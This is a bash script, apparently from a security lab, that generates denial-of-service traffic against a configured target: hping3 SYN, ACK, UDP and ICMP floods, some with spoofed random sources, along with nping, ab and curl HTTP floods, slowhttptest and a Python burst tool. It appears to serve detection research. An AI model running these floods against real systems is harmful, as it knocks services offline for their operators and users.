#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=../lib.sh
source "${LAB_DIR}/lib.sh"

MODE="${1:-mixed}"
DURATION="${2:-45}"
HTTP_PORT="${HTTP_PORT:-8080}"
PORT="${3:-${HTTP_PORT}}"

require_lab_target "$TARGET_IP"

run_sudo_timeout() {
  local duration="$1"
  shift
  sudo timeout "$duration" "$@" || true
}

http_curl_flood() {
  local duration="$1"
  local end=$((SECONDS + duration))
  while (( SECONDS < end )); do
    for _ in {1..80}; do
      curl -s -o /dev/null --connect-timeout 1 -m 2 "${TARGET_URL}/?r=$RANDOM" &
    done
    wait || true
  done
}

echo "Generating dos_ddos/${MODE} for ${DURATION}s against ${TARGET_IP}:${PORT}"

case "$MODE" in
  tcp_syn)
    require_cmd hping3
    echo "Note: hping3 flood mode normally reports 0 replies/100% packet loss; transmitted packets are the signal."
    run_sudo_timeout "$DURATION" hping3 -S --flood -p "$PORT" "$TARGET_IP"
    ;;
  tcp_syn_rand)
    require_cmd hping3
    echo "Note: hping3 flood mode normally reports 0 replies/100% packet loss; transmitted packets are the signal."
    run_sudo_timeout "$DURATION" hping3 -S --flood --rand-source -p "$PORT" "$TARGET_IP"
    ;;
  tcp_ack)
    require_cmd hping3
    run_sudo_timeout "$DURATION" hping3 -A --flood -p "$PORT" "$TARGET_IP"
    ;;
  udp)
    require_cmd hping3
    run_sudo_timeout "$DURATION" hping3 --udp --flood -p "$PORT" "$TARGET_IP"
    ;;
  udp_rand)
    require_cmd hping3
    run_sudo_timeout "$DURATION" hping3 --udp --flood --rand-source -p "$PORT" "$TARGET_IP"
    ;;
  icmp)
    require_cmd hping3
    run_sudo_timeout "$DURATION" hping3 --icmp --flood "$TARGET_IP"
    ;;
  nping_tcp)
    if command -v nping >/dev/null 2>&1; then
      run_sudo_timeout "$DURATION" nping --tcp -c 0 --rate 1500 -p "$PORT" "$TARGET_IP"
    else
      "$0" tcp_syn "$DURATION" "$PORT"
    fi
    ;;
  nping_udp)
    if command -v nping >/dev/null 2>&1; then
      run_sudo_timeout "$DURATION" nping --udp -c 0 --rate 1500 -p "$PORT" "$TARGET_IP"
    else
      "$0" udp "$DURATION" "$PORT"
    fi
    ;;
  http_ab)
    if command -v ab >/dev/null 2>&1; then
      timeout "$DURATION" ab -n 200000 -c 250 "${TARGET_URL}/" || true
    else
      http_curl_flood "$DURATION"
    fi
    ;;
  http_curl)
    http_curl_flood "$DURATION"
    ;;
  tcp_connect_burst)
    python3 "${LAB_DIR}/attacks/flow_burst.py" --mode tcp --target-ip "$TARGET_IP" --ports "${DDOS_TCP_PORTS:-1-1024,64295,8080,8000}" --duration "$DURATION" --rate "${DDOS_TCP_RATE:-500}" --workers 160
    ;;
  udp_burst)
    python3 "${LAB_DIR}/attacks/flow_burst.py" --mode udp --target-ip "$TARGET_IP" --ports "${DDOS_UDP_PORTS:-1-1024}" --duration "$DURATION" --rate "${DDOS_UDP_RATE:-700}" --workers 160
    ;;
  http_burst)
    python3 "${LAB_DIR}/attacks/flow_burst.py" --mode http --target-ip "$TARGET_IP" --port "$PORT" --duration "$DURATION" --rate "${DDOS_HTTP_RATE:-300}" --workers 160
    ;;
  slow_http)
    if command -v slowhttptest >/dev/null 2>&1; then
      timeout "$DURATION" slowhttptest -c 500 -H -g -o /tmp/edge_slowhttp -i 5 -r 100 -t GET -u "${TARGET_URL}/" -x 24 -p 3 || true
    else
      http_curl_flood "$DURATION"
    fi
    ;;
  mixed)
    "$0" tcp_syn "$((DURATION / 3 + 1))" "$PORT"
    "$0" udp "$((DURATION / 3 + 1))" "$PORT"
    "$0" http_curl "$((DURATION / 3 + 1))" "$PORT"
    ;;
  *)
    echo "Unknown mode: ${MODE}" >&2
    echo "Modes: tcp_syn, tcp_syn_rand, tcp_ack, udp, udp_rand, icmp, nping_tcp, nping_udp, http_ab, http_curl, slow_http, mixed" >&2
    exit 2
    ;;
esac
